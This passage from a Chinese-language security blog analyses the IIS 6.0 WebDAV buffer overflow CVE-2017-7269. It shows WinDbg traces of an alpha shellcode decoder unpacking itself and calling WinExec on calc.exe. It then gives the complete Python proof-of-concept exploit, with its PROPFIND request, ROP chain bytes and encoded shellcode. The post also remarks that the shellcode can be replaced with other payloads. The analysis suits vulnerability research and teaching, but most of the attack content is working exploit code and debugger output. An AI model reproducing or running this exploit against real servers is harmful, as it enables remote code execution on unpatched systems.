Protect:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00000040&nbsp;&nbsp;&nbsp;&nbsp;PAGE_EXECUTE_READWRITE&nbsp;&nbsp;有了可执行权限</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这里由于url存入内存按照宽字节存放，因此都是以00 xx方式存放，因此不能单纯使用shellcode，而得用alpha shellcode（结尾基友用了另一种方法执行shellcode，大家可以看下），alpha shellcode会先执行一段操作。随后进入解密部分。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=059003d9&nbsp;ebx=7ffe0300&nbsp;ecx=68031585&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803154e&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;ac&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000292
rsaenh!g_pfnFree+0x292:
6803154e&nbsp;41&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx
0:009&gt;&nbsp;p
eax=059003d9&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803154f&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
rsaenh!g_pfnFree+0x293:
6803154f&nbsp;004200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[edx],al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:68031568=e3
0:009&gt;&nbsp;p
eax=059003d9&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=68031552&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;na&nbsp;po&nbsp;cy
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000283
rsaenh!g_pfnFree+0x296:
68031552&nbsp;6b0110&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;imul&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ecx],10h&nbsp;ds:0023:68031586=00540032
0:009&gt;&nbsp;p
eax=05400320&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=68031555&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
rsaenh!g_pfnFree+0x299:
68031555&nbsp;024102&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,byte&nbsp;ptr&nbsp;[ecx+2]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:68031588=54
0:009&gt;&nbsp;p
eax=05400374&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=68031558&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
rsaenh!g_pfnFree+0x29c:
68031558&nbsp;8802&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[edx],al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:68031568=bc
0:009&gt;&nbsp;p
eax=05400374&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031568&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803155a&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
rsaenh!g_pfnFree+0x29e:
6803155a&nbsp;42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx
0:009&gt;&nbsp;p
eax=05400374&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031569&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803155b&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
rsaenh!g_pfnFree+0x29f:
6803155b&nbsp;803941&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[ecx],41h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:68031586=32
0:009&gt;&nbsp;p
eax=05400374&nbsp;ebx=7ffe0300&nbsp;ecx=68031586&nbsp;edx=68031569&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803155e&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;na&nbsp;po&nbsp;cy
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000283
rsaenh!g_pfnFree+0x2a2:
6803155e&nbsp;75e2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsaenh!g_pfnFree+0x286&nbsp;(68031542)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[br=1]
0:009&gt;&nbsp;dd&nbsp;68031580
68031580&nbsp;&nbsp;00380059&nbsp;00320059&nbsp;004d0054&nbsp;004a0054
68031590&nbsp;&nbsp;00310054&nbsp;0030004d&nbsp;00370031&nbsp;00360059
680315a0&nbsp;&nbsp;00300051&nbsp;00300031&nbsp;00300031&nbsp;004c0045
680315b0&nbsp;&nbsp;004b0053&nbsp;00300053&nbsp;004c0045&nbsp;00330053</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，解密前，alpha shellcod部分，随后解密结束之后。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=04d0035d&nbsp;ebx=7ffe0300&nbsp;ecx=68031592&nbsp;edx=6803156c&nbsp;esi=68031460&nbsp;edi=680124e3
eip=6803155e&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;na&nbsp;pe&nbsp;cy
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000287
rsaenh!g_pfnFree+0x2a2:
6803155e&nbsp;75e2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsaenh!g_pfnFree+0x286&nbsp;(68031542)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[br=1]
0:009&gt;&nbsp;bp&nbsp;68031560
0:009&gt;&nbsp;g
Breakpoint&nbsp;2&nbsp;hit
eax=00000410&nbsp;ebx=7ffe0300&nbsp;ecx=680318da&nbsp;edx=6803163e&nbsp;esi=68031460&nbsp;edi=680124e3
eip=68031560&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!g_pfnFree+0x2a4:
68031560&nbsp;b8b726bfca&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,0CABF26B7h
0:009&gt;&nbsp;dd&nbsp;68031580
68031580&nbsp;&nbsp;223cec9b&nbsp;265a2caa&nbsp;6a289c9c&nbsp;9f7c5610
68031590&nbsp;&nbsp;90a91aa3&nbsp;9f8f9004&nbsp;beec8995&nbsp;6120d015
680315a0&nbsp;&nbsp;60351b24&nbsp;30b44661&nbsp;a56b0c3a&nbsp;4eb0584f
680315b0&nbsp;&nbsp;b3b04c03&nbsp;65916fd3&nbsp;87313668&nbsp;9f7842bd
680315c0&nbsp;&nbsp;14326fa2&nbsp;fcc51b10&nbsp;c16ae469&nbsp;05721746
680315d0&nbsp;&nbsp;7f01c860&nbsp;44127593&nbsp;5f97a1ee&nbsp;840f2148
680315e0&nbsp;&nbsp;4fd6e669&nbsp;089c4365&nbsp;23715269&nbsp;e474df95</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode已经被解密出来，随后会调用winexec，执行calc。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=77ea411e&nbsp;ebx=7ffe0300&nbsp;ecx=68031614&nbsp;edx=876f8b31&nbsp;esi=68031460&nbsp;edi=680124e3
eip=680315f9&nbsp;esp=680313fc&nbsp;ebp=68031581&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
rsaenh!g_pfnFree+0x33d:
680315f9&nbsp;51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ecx
0:009&gt;&nbsp;p
eax=77ea411e&nbsp;ebx=7ffe0300&nbsp;ecx=68031614&nbsp;edx=876f8b31&nbsp;esi=68031460&nbsp;edi=680124e3
eip=680315fa&nbsp;esp=680313f8&nbsp;ebp=68031581&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
rsaenh!g_pfnFree+0x33e:
680315fa&nbsp;ffe0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax&nbsp;{kernel32!WinExec&nbsp;(77ea411e)}
0:009&gt;&nbsp;dd&nbsp;esp
680313f8&nbsp;&nbsp;68031614&nbsp;68031633&nbsp;00000001&nbsp;00000000
0:009&gt;&nbsp;dc&nbsp;68031633&nbsp;l2
68031633&nbsp;&nbsp;636c6163&nbsp;6578652e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;calc.exe</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第二个参数是0x1，是SW_SHOWNORMAL，但由于服务无窗口，因此calc无法弹出。</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p0.qhimg.com/t01f0473c8c700f021d.png" title="t01d0fd054a3789d53a.png" alt="http://p0.qhimg.com/t01d0fd054a3789d53a.png"/><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong><br/></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其实，这个过程可以替换成其他的shellcode，相关的shellcode替换链接可以看我的好基友LCatro的几篇文章，都非常不错。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/" _src="https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/">https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后我想说，我在深圳，刚才和几个平时网上的好朋友吃夜宵，聊到这个漏洞，没想到在几个小时前认识的彭博士，就是这个漏洞的作者！真的没有想到，还好自己分析的这套思路和这个漏洞作者的思路相差无几，不然就被打脸了。真的很有缘！一下学到了好多。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这篇最后还是没有按时发出，不过希望能和大家一起学习！谢谢阅读！</span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PoC</span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">(来源网络<a href="https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py" target="_self">https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py</a>)</span></p><hr/><pre class="brush:bash;toolbar:false">#------------Our&nbsp;payload&nbsp;set&nbsp;up&nbsp;a&nbsp;ROP&nbsp;chain&nbsp;by&nbsp;using&nbsp;the&nbsp;overflow&nbsp;3&nbsp;times.&nbsp;It&nbsp;will&nbsp;launch&nbsp;a&nbsp;calc.exe&nbsp;which&nbsp;shows&nbsp;the&nbsp;bug&nbsp;is&nbsp;really&nbsp;dangerous.
#written&nbsp;by&nbsp;Zhiniang&nbsp;Peng&nbsp;and&nbsp;Chen&nbsp;Wu.&nbsp;Information&nbsp;Security&nbsp;Lab&nbsp;&amp;&nbsp;School&nbsp;of&nbsp;Computer&nbsp;Science&nbsp;&amp;&nbsp;Engineering,&nbsp;South&nbsp;China&nbsp;University&nbsp;of&nbsp;Technology&nbsp;Guangzhou,&nbsp;China&nbsp;
#-----------Email:&nbsp;edwardz@foxmail.com
import&nbsp;socket&nbsp;&nbsp;
sock&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)&nbsp;&nbsp;
sock.connect((&#39;127.0.0.1&#39;,80))&nbsp;&nbsp;
pay=&#39;PROPFIND&nbsp;/&nbsp;HTTP/1.1\r\nHost:&nbsp;localhost\r\nContent-Length:&nbsp;0\r\n&#39;
pay+=&#39;If:&nbsp;&lt;http://localhost/aaaaaaa&#39;
pay+=&#39;\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac&#39;
pay+=&#39;&gt;&#39;
pay+=&#39;&nbsp;(Not&nbsp;&lt;locktoken:write1&gt;)&nbsp;&lt;http://localhost/bbbbbbb&#39;
pay+=&#39;\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81&#39;
shellcode=&#39;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA&#39;
pay+=shellcode
pay+=&#39;&gt;\r\n\r\n&#39;
print&nbsp;pay
sock.send(pay)&nbsp;&nbsp;
data&nbsp;=&nbsp;sock.recv(80960)&nbsp;&nbsp;
print&nbsp;data&nbsp;
